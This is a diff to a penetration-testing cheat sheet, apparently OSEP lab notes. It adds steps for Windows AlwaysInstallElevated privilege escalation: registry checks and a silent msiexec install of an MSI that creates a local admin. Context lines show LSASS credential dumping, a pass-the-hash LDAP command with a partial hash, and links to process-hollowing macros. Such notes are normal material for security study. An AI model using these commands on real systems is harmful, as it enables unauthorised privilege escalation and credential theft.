@@ -320,6 +320,27 @@ nanodump
 python3 -m pypykatz lsa minidump 704
 ```
 
+### AlwaysInstallElevated
+
+Elevate using AlwaysInstallElevated 
+
+Check if enable.
+```
+shell reg query HKCU\SOFTWARE\Policies\Microsoft\windows\Installer /v AlwaysInstallElevated
+shell reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated
+```
+
+Upload msi and execute. 
+
+```
+# upload newlocaladmin.msi
+shell msiexec /quiet /qn /i newlocaladmin.msi
+```
+
+REF: 
+- https://github.com/Extravenger/OSEPlayground/tree/main/06%20-%20Privilege%20Escalation/AlwaysInstallElevated
+- https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md
+
 ### SAM REG
 
 Save SAM, SECURITY, and SYSTEM hives for offline secrets extraction. Util when Mimikatz doesn't works. 
@@ -583,3 +604,5 @@ proxychains -q netexec ldap  DENKIAIR-OPS.COM -u 'DB02$' -H 11fa4c77b840818b6da8
 - [https://ippsec.rocks/](https://ippsec.rocks/)
 - https://github.com/hackinaggie/OSEP-Tools-v2/blob/main/Macros/process_hollowing.vba
 - https://github.com/ColeHouston/word-vba-process-hollowing
+- https://github.com/Extravenger/OSEPlayground/tree/main/06%20-%20Privilege%20Escalation/AlwaysInstallElevated
+- https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md
